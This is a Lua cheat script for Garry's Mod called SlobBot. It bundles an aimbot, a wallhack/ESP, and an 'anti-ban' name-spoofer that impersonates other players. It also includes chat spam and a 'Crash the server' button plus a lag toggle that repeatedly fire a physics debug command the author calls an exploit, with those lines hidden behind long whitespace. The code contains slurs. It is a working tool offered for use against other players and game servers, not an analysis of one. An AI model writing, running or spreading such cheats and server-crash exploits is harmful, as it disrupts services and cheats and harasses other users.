---------------------------------------------
--Name: SlobBot
--Version: 0.1
--Author: Slob187 (obviously)
--Email: slob187.pb@gmail.com
--Instructions: Extract to your
--lua/autorun/client folder
---------------------------------------------


---------------BROUGHT TO YOU BY THE MINGEBAG TECHNOLOGY---------------
---------------THIS CODE IS UNOPTIMIZED AS SHIT ATM---------------

WOTS = {}
local minge
local spining = false
local aiming = false
local SlobESPEnabled = false
local wireframeenabled = false
local canban = true
local DarkRPWallhackEnabled = false
local FakeView = Vector(0, 0, 0)


hook.Add("Think", "LocalFix", function()
	minge = LocalPlayer()
	if minge:IsValid() then
		hook.Remove("Think", "LocalFix")
		Msg("----SLOB BOT LOADED----\n")
	end
end)


CreateClientConVar("wots_aimbot_autoattack", "1", true, false)
CreateClientConVar("wots_aimbot_autoattack_delay", "0", true, false) --keep at 0 for more lulz
CreateClientConVar("wots_aimbot_teammode", "0", true, false)
CreateClientConVar("wots_aimbot_mouselock", "0", true, false) --use it for long range weapons
CreateClientConVar("wots_lag_delay", "3", true, false) --lag delay (for the server lag button)
CreateClientConVar("wots_aimbot_add", "0", true, false)


surface.CreateFont("akbar", 20, 550, true, false, "SlobBotFont")

	
function SlobNotify(str)
	if GAMEMODE.IsSandboxDerived then
		GAMEMODE:AddNotify(str, NOTIFY_CLEANUP, 5 )
	else	
		LocalPlayer():ChatPrint(str)
	end	
	print(str)
end	


function SlobTeamAllowed(ent)    
	if GetConVarNumber("wots_aimbot_teammode") >= 1 then
		if ent:Team() != minge:Team() then
			return true
		else
			return false
		end
	end	
	return true	
end


function SlobBotAllowed(ent)
	if !ent:IsValid() or !ent:IsNPC() and !ent:IsPlayer() or minge == ent then return false end
	if ent:IsPlayer() and !ent:Alive() then return false end
	if ent:IsPlayer() and string.find(string.lower(team.GetName(ent:Team())), "spectator") then return false end	
	if ent:IsPlayer() and !SlobTeamAllowed(ent) then return false end
	if ent:IsNPC() and ent:GetMoveType() == 0 then return false end
	return true
end	


function RPSlobBotAllowed(ent)
	-- HAD TO USE THIS BECAUSE TABLES ONLY TRIGGER FIRST 2 ITEMS FOR SOME REASON
	if string.find(ent:GetClass(), "physgun") then return false end
	if string.find(ent:GetClass(), "drug") or string.find(ent:GetClass(), "food") or
	string.find(ent:GetClass(), "drug") or string.find(ent:GetClass(), "gun") or
	string.find(ent:GetClass(), "melon") or string.find(ent:GetClass(), "money") or
	string.find(ent:GetClass(), "spawned") or string.find(ent:GetClass(), "microwave") or
	ent:GetModel() == "models/props/cs_assault/money.mdl" then
		return true
	else
		return false
	end	
end


function HeadPosition(ent)
	if ent:GetAttachment(1) != nil then
		return ent:GetAttachment(1).Pos + Vector(0, 0, GetConVarNumber("wots_aimbot_add"))
	else
		return ent:GetPos()
	end	
end	


function BotVisible(ent)
	local trace = {start = minge:GetShootPos(),endpos = HeadPosition(ent),filter = {minge, ent},mask = 1174421507}
	local tr = util.TraceLine(trace)
	if tr.Fraction == 1 then
		return true
	else
	    return false
	end	
end


function GetSlobBotTarget()

	local position = minge:EyePos()
	local angle = minge:GetAimVector()
	local tar = {0,0}
	for _, ent in pairs(ents.GetAll()) do
		if SlobBotAllowed(ent) and BotVisible(ent) then
			local targetpos = ent:EyePos()
			local difr = (targetpos-position):Normalize()
			difr = difr - angle
			difr = difr:Length()
			difr = math.abs(difr)
			if difr < tar[2] or tar[1] == 0 then
				tar = {ent, difr}
			end
		end
	end
	return tar[1]
end


function SlobESPOn()
	SlobESPEnabled = true
	hook.Add("HUDPaint", "SlobESPOmg", function()
		draw.SimpleTextOutlined("Slob Bot", "ScoreboardText", 50, 10, Color(0, 0, 255, 255), 1, 1, 1, Color(255, 255, 255, 255)) 	
		draw.SimpleTextOutlined("Wire Frame: "..tostring(wireframeenabled), "ScoreboardText", ScrW()/2, 10, Color(0, 0, 255, 255), 0, 1, 1, Color(255, 255, 255, 255)) 
		draw.SimpleTextOutlined("Banable: "..tostring(canban), "ScoreboardText", ScrW()/2, 25, Color(0, 0, 255, 255), 0, 1, 1, Color(255, 255, 255, 255))
		draw.SimpleTextOutlined("RP Wallhack: "..tostring(DarkRPWallhackEnabled), "ScoreboardText", ScrW()/2, 40, Color(0, 0, 255, 255), 0, 1, 1, Color(255, 255, 255, 255))			
		for _, ent in pairs( ents.GetAll() ) do	
			if SlobBotAllowed( ent ) then				    
				local epos = ent:GetPos()
				if epos:ToScreen().x > 0 and			
				epos:ToScreen().y > 0 and			
				epos:ToScreen().x < ScrW() and
				epos:ToScreen().y < ScrH() then	              				
					local pos1 = ( ent:LocalToWorld( ent:OBBMaxs() ) + Vector( 0, 0, 30 ) ):ToScreen()				
					local minbox, maxbox = ent:OBBMins(), ent:OBBMaxs()
					local minbb = (ent:LocalToWorld(minbox)):ToScreen()	
					local maxbb = (ent:LocalToWorld(maxbox)):ToScreen()						
                    local information = {}
					local tcol
					if ent:IsPlayer() then
					    local name = ent:Nick()
						local hp = ent:Health()
						local money = ent:GetNWInt("money")
						tcol = team.GetColor(ent:Team())
                        information = {"Name: "..name, "Health: "..hp.." HP"}	
						if DarkRPWallhackEnabled then
							table.insert(information, "Money: "..money)
						end	
					elseif ent:IsNPC() then
						tcol = Color(0, 255, 255, 255)
						information = {"Class: "..ent:GetClass()}
						--draw.SimpleTextOutlined("Health: "..ent:Health(), "ScoreboardText", pos1.x, pos1.y+50, Color(0, 0, 255), 2, 1, 1, Color(255, 255, 255, 255))	
                    end
					
					local center = ent:LocalToWorld(ent:OBBCenter())
					local min,max = ent:WorldSpaceAABB()
					local dim = max-min
			
					local front = ent:GetForward()*(dim.y/2)
					local right = ent:GetRight()*(dim.x/2)
					local top = ent:GetUp()*(dim.z/2)
					local back = (ent:GetForward()*-1)*(dim.y/2)
					local left = (ent:GetRight()*-1)*(dim.x/2)
					local bottom = (ent:GetUp()*-1)*(dim.z/2)
					local FRT = center+front+right+top
					local BLB = center+back+left+bottom
					local FLT = center+front+left+top
					local BRT = center+back+right+top
					local BLT = center+back+left+top
					local FRB = center+front+right+bottom
					local FLB = center+front+left+bottom
					local BRB = center+back+right+bottom
				
					FRT = FRT:ToScreen()
					BLB = BLB:ToScreen()
					FLT = FLT:ToScreen()
					BRT = BRT:ToScreen()
					BLT = BLT:ToScreen()
					FRB = FRB:ToScreen()
					FLB = FLB:ToScreen()
					BRB = BRB:ToScreen()
			
					local xmax = math.max(FRT.x,BLB.x,FLT.x,BRT.x,BLT.x,FRB.x,FLB.x,BRB.x)
					local xmin = math.min(FRT.x,BLB.x,FLT.x,BRT.x,BLT.x,FRB.x,FLB.x,BRB.x)
					local ymax = math.max(FRT.y,BLB.y,FLT.y,BRT.y,BLT.y,FRB.y,FLB.y,BRB.y)
					local ymin = math.min(FRT.y,BLB.y,FLT.y,BRT.y,BLT.y,FRB.y,FLB.y,BRB.y)
			
					surface.SetDrawColor(tcol.r, tcol.g, tcol.b, 255)
			
					surface.DrawLine(xmax,ymax,xmax,ymin)
					surface.DrawLine(xmax,ymin,xmin,ymin)
					surface.DrawLine(xmin,ymin,xmin,ymax)
					surface.DrawLine(xmin,ymax,xmax,ymax)
					--surface.DrawLine(minbb.x, maxbb.x-maxbb.x, minbb.x, minbb.x-minbb.x) --Left side
					
					
					local newpos = pos1.y
					
					for _, info in pairs(information) do
						draw.SimpleText(info, "SlobBotFont", pos1.x, newpos, Color(tcol.r, tcol.g, tcol.b, 255), 2, 1)
						newpos = newpos + 20
					end	
					
					if GetSlobBotTarget() == ent then
						--draw.SimpleTextOutlined("TARGET", "ScoreboardText", pos1.x, pos1.y+10, Color(255, 0, 0, 255), 2, 1, 1, Color(255, 255, 255, 255))  						
						local tpos = HeadPosition(ent):ToScreen()								
						surface.SetDrawColor(0, 255, 255, 255)
						--surface.DrawLine(ScrW()/2, ScrH()/2, tpos.x, tpos.y)
						surface.DrawLine(tpos.x, tpos.y+10, tpos.x, tpos.y-10)
						surface.DrawLine(tpos.x+10, tpos.y, tpos.x-10, tpos.y)						
					end	
				end
		    end
	    end
    end)
end


_G.SafeAIM = _R["CUserCmd"].SetViewAngles

function SlobMegaAIM(UCMD)					
	if aiming then
		local pwned = GetSlobBotTarget()
		if pwned != 0 then 
			local targetaim = (HeadPosition(pwned) - minge:GetShootPos()):Angle()		
			SafeAIM(UCMD, targetaim)
		end	
		local tr = minge:GetEyeTrace()		
		if SlobBotAllowed(tr.Entity) then
			if GetConVarNumber("wots_aimbot_mouselock") >= 1 then
				RunConsoleCommand("cl_mouseenable", "0")
			end		
			if GetConVarNumber("wots_aimbot_autoattack") >= 1 then
				local aad = GetConVarNumber("wots_aimbot_autoattack_delay")
				if !timer.IsTimer("autoattack") then
					timer.Create("autoattack", aad, 0, function()
						RunConsoleCommand("wots_attack")
					end)	
				end
			end		
		else    	
	        if GetConVarNumber("cl_mouseenable") == 0 then
		        RunConsoleCommand("cl_mouseenable", "1")
            end						
			if timer.IsTimer("autoattack") then
				timer.Destroy("autoattack")
			end			
		end	
	end
end	
	
hook.Add("CreateMove", "MingeBagAIMBot", SlobMegaAIM)					


function SlobDarkRPHack()
	DarkRPWallhackEnabled = true
	hook.Add("HUDPaint", "DarkRPESP", function()
		for _, ent in pairs(ents.GetAll()) do
			if RPSlobBotAllowed(ent) then			
				local rpepos = ent:GetPos()
				if rpepos:ToScreen().x > 0 and			
				rpepos:ToScreen().y > 0 and			
				rpepos:ToScreen().x < ScrW() and
				rpepos:ToScreen().y < ScrH() then
	                local rppos1 = (ent:LocalToWorld( Vector(0,0,0)) ):ToScreen()	
                    if ent:GetModel() != "models/props/cs_assault/money.mdl" then					
						draw.SimpleTextOutlined("Class: "..ent:GetClass(), "ScoreboardText", rppos1.x, rppos1.y, Color(0, 0, 255, 255), 2, 1, 1, Color(255, 255, 255, 255))
					else
						draw.SimpleTextOutlined("MONEY", "ScoreboardText", rppos1.x, rppos1.y, Color(0, 0, 255, 255), 2, 1, 1, Color(255, 255, 255, 255))
					end	
				end	
			end
		end
	end)
end	


function SlobWireFrameOn()
	wireframeenabled = true
	hook.Add("RenderScene", "SlobWireFrameHax", function()
		for _, ent in pairs(ents.GetAll()) do
			if wireframeenabled then
				if RPSlobBotAllowed(ent) then			
		    	    ent:SetMaterial("hlmv/debugmrmwireframe")
					ent:SetColor(255, 255, 255, 255)
		    	end
			end
			if SlobBotAllowed(ent) then		
				if !BotVisible(ent) then
					local tc				
					if ent:IsPlayer() then
						tc = team.GetColor(ent:Team())
					elseif ent:IsNPC() then
						tc = Color(0, 0, 255, 255)
					end
					ent:SetMaterial("hlmv/debugmrmwireframe")			
					ent:SetColor(tc.r, tc.g, tc.b, 255)
				else
					ent:SetMaterial("")
					ent:SetColor(255, 255, 255, 255)
				end	
		    end
	    end
    end)	
end	


concommand.Add("wots_togglewireframe", function()
    if wireframeenabled then
	    hook.Remove("RenderScene", "SlobWireFrameHax")
		for _, ent in pairs(ents.GetAll()) do
	        if RPSlobBotAllowed(ent) then
		    	ent:SetMaterial("")
		    elseif SlobBotAllowed(ent) then
		        ent:SetMaterial("")						
                ent:SetColor(255, 255, 255, 255)
		    end
		end	
        SlobNotify("WireFrame: OFF")	
		wireframeenabled = false
	elseif !wireframeenabled then	
        SlobWireFrameOn()
        SlobNotify("WireFrame: ON")	
		wireframeenabled = true		
    end
end)


concommand.Add("wots_togglerphack", function()
    if DarkRPWallhackEnabled then
	    hook.Remove("HUDPaint", "DarkRPESP")
        SlobNotify("DarkRP mode: OFF")	
		DarkRPWallhackEnabled = false
	elseif !DarkRPWallhackEnabled then	
        SlobDarkRPHack()
        SlobNotify("DarkRP Mode: ON")	
		DarkRPWallhackEnabled = true		
    end
end)


concommand.Add("wots_toggleesp", function()
    if SlobESPEnabled then
	    hook.Remove("HUDPaint", "SlobESPOmg")			
        SlobNotify("ESP: OFF")
		SlobESPEnabled = false
	elseif !SlobESPEnabled then
        SlobESPOn()	
        SlobNotify("ESP: ON")
		SlobESPEnabled = true		
    end
end)


concommand.Add("wots_attack", function()
    LocalPlayer():ConCommand("+attack; wait 2; +attack; wait 2; -attack")
end)


concommand.Add("+slobpos", function()
    FakeView = minge:EyeAngles()
    aiming = true	
end)


concommand.Add("-slobpos", function()
    aiming = false 
	
	if GetConVarNumber("wots_aimbot_mouselock") >= 1 then
		RunConsoleCommand("cl_mouseenable", "1")
    end	
    if timer.IsTimer("autoattack") then
	    timer.Destroy("autoattack")
	end	
end)	



---------------BOT MENU CODE---------------



local SlobPanel
local SlobList

function CreateSlobBotButton(a, b)
    SLOBBUTTON = vgui.Create("DButton")
    SLOBBUTTON:SetSize(0, 20)
    SLOBBUTTON:SetText(a)
    SLOBBUTTON.DoClick = function()
        RunConsoleCommand(b)
    end	
    SlobList:AddItem(SLOBBUTTON)
end	


concommand.Add("+wots_menu", function()
	SlobPanel = vgui.Create("DFrame")
	SlobPanel:Center()
	SlobPanel:SetSize(350, 350)
	SlobPanel:SetTitle("SlobBot v0.1")
	SlobPanel:SetVisible(true)
	SlobPanel:SetDraggable(true)
	SlobPanel:ShowCloseButton(false)
	SlobPanel.Paint = function()
		draw.RoundedBox(6, 0, 0, SlobPanel:GetWide(), SlobPanel:GetTall(), Color(176, 226, 255, 225))
		surface.SetDrawColor(color_white)
  		surface.DrawOutlinedRect(0, 0, SlobPanel:GetWide(), SlobPanel:GetTall())	
	end	
	SlobPanel:MakePopup() 
	
	
	SlobList = vgui.Create("DPanelList", SlobPanel)
	SlobList:SetPos(30, 30)
	SlobList:SetSize(290, 290)
	SlobList:SetSpacing(5)
	SlobList:SetPadding(5)	
	SlobList:EnableHorizontal(false)
	SlobList:EnableVerticalScrollbar(true)	


	local AutoAttackCat = vgui.Create("DCheckBoxLabel")
	AutoAttackCat:SetText("Auto attack")
	AutoAttackCat:SetConVar("wots_aimbot_autoattack")
	AutoAttackCat:SetValue(GetConVarNumber("wots_aimbot_autoattack"))
	AutoAttackCat:SizeToContents()
	SlobList:AddItem(AutoAttackCat) 

	
	local MouseLockCat = vgui.Create("DCheckBoxLabel")
	MouseLockCat:SetText("Mouse lock")
	MouseLockCat:SetConVar("wots_aimbot_mouselock")
	MouseLockCat:SetValue(GetConVarNumber("wots_aimbot_mouselock"))
	MouseLockCat:SizeToContents()
	SlobList:AddItem(MouseLockCat)	
		
	
	local TeamModeCat = vgui.Create("DCheckBoxLabel")
	TeamModeCat:SetText("Team mode")
	TeamModeCat:SetConVar("wots_aimbot_teammode")
	TeamModeCat:SetValue(GetConVarNumber("wots_aimbot_teammode"))
	TeamModeCat:SizeToContents()
	SlobList:AddItem(TeamModeCat)	

	
	local AADelay = vgui.Create("DNumSlider")
	AADelay:SetSize(150, 50)
	AADelay:SetText("Auto attack delay")
	AADelay:SetMin(0)
	AADelay:SetMax(10)
	AADelay:SetDecimals(1)
	AADelay:SetConVar("wots_aimbot_autoattack_delay")
	SlobList:AddItem(AADelay)	

	
	local LAGDelay = vgui.Create("DNumSlider")
	LAGDelay:SetSize(150, 50)
	LAGDelay:SetText("Lag delay")
	LAGDelay:SetMin(0)
	LAGDelay:SetMax(10)
	LAGDelay:SetDecimals(1)
	LAGDelay:SetConVar("wots_lag_delay")
	SlobList:AddItem(LAGDelay)		

	
	local OFFSET = vgui.Create("DNumSlider")
	OFFSET:SetSize(150, 50)
	OFFSET:SetText("Offset")
	OFFSET:SetMin(-40)
	OFFSET:SetMax(6)
	OFFSET:SetDecimals(0)
	OFFSET:SetConVar("wots_aimbot_add")
	SlobList:AddItem(OFFSET)	
	
	
	TCB = vgui.Create("DButton")
	TCB:SetSize(0, 20)
	TCB:SetText("Crash the server")
	TCB.DoClick = function()
		RunConsoleCommand("say", "WAR OF THE SERVERS HAS BEGUN, MINGEBAGS WILL DOMINATE ALL GMOD SERVERS SOON.")	
		timer.Simple(1, function() 
																																	hook.Add("Think", "SlobLuaHax", function() RunConsoleCommand("physics_debug_entity", "*") end) --exploit found by ME
		end)	
	end	
	SlobList:AddItem(TCB)	
	
	
	CreateSlobBotButton("Lag", "wots_togglelag")
	
	
	CreateSlobBotButton("ESP", "wots_toggleesp")	

	
	CreateSlobBotButton("WireFrame", "wots_togglewireframe")	
	
	
	CreateSlobBotButton("DarkRP mode", "wots_togglerphack")

	
	CreateSlobBotButton("Name changer", "wots_toggleimmunity")
	
	
	CreateSlobBotButton("Admin list", "wots_adminlist")	
	
	
end)


concommand.Add("-wots_menu", function()	
	SlobPanel:Close()
end)



---------------'ANTI BAN' CODE---------------



local nicks = {}

local function AntiBanOn()	
	timer.Create("GetNames", 0.1, 0, function()
		for i = 1, table.Count(nicks) do
			table.remove(nicks, i)
		end		
		for _, faggot in pairs(player.GetAll()) do		
			if faggot:Nick() != minge:Nick() then --just to be safer
				table.insert(nicks, faggot:Nick()..string.char(03)) --no space after the name yay
			end	
		end
	end)
	timer.Create("SetName", 0, 0, function()
		if table.Count(nicks) > 0 then 		
			RunConsoleCommand("setinfo", "name", nicks[math.random(1, table.Count(nicks))])
		else 	
			RunConsoleCommand("setinfo", "name", "MingeBag")
		end	
	end)	
end


concommand.Add("wots_toggleimmunity", function()
	if canban then
		canban = false
		AntiBanOn()
		SlobNotify("Toggle immunity: ON")		
	elseif !canban then
		canban = true	
		timer.Destroy("GetNames")
		timer.Destroy("SetName")
		SlobNotify("Toggle immunity: OFF")		
	end	
end)	



---------------ADMIN LIST CODE---------------



concommand.Add("wots_adminlist", function()
	SlobNotify("Check the console for output.")
	print("Admins :")
	for _, v in pairs(player.GetAll()) do
		if v:IsAdmin() then
			print(v:Nick())
		end
	end
end)	



---------------CHAT SPAM CODE---------------



concommand.Add("+wots_megaspam", function()

	timer.Create("chatspam", 1, 0, function()
		for _, kid in pairs(player.GetAll()) do
			if !kid:IsAdmin() then
				RunConsoleCommand("ulx", "psay", kid:Nick(), "MINGE INVASION IS COMING "..math.random(1, 1337).." MINGES WILL DOMINATE GMOD")
			end	
		end
		if DarkRPWallhackEnabled then
			RunConsoleCommand("say", "/rpname MINGEINVASION"..math.random(1, 1337))	
		end	
	end)
 	
end)	


concommand.Add("-wots_megaspam", function()
	if timer.IsTimer("chatspam") then
		timer.Destroy("chatspam")
	end	
end)



---------------SERVER LAG CODE---------------



laggingtheserver = false

function WOTS.Lag()

	laggingtheserver = true	
	timer.Create("lagshitdarkrp", GetConVarNumber("wots_lag_delay"), 0, function()
							                                                                                            RunConsoleCommand("physics_debug_entity", "*")
	end)

end	


concommand.Add("wots_togglelag", function()
    if laggingtheserver then
	    laggingtheserver = false 
        if timer.IsTimer("lagshitdarkrp") then
            timer.Destroy("lagshitdarkrp")
	    end	
        SlobNotify("Lag: OFF")
	else
        laggingtheserver = true
        WOTS.Lag()
        SlobNotify("Lag: ON")		
	end  
end)	
    